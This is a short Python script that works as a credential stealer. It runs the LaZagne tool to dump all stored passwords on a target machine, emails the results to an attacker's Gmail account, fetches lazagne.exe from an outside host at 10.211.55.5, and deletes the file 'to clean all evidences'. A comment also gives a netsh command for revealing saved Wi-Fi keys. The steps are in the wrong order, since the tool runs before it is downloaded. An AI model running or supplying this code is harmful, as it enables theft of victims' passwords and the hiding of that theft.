#!/usr/bin/env python
import requests
import tempfile
import subprocess
import smtplib
import os


# Simple function to send message to email that you enter
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# Function to download file from url and name file the same as written in url
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


# Getting temporary file and change working directory to download file their and del it
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
# netsh wlan show profile WI-FI key=clear  - command that allow as to get password of all
# networks that out target used to
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("email@gmail.com", "Password", result)
download("http://10.211.55.5/evil_file/lazagne.exe")

# Deleting file to clean all evidences
os.remove("lazagne.exe")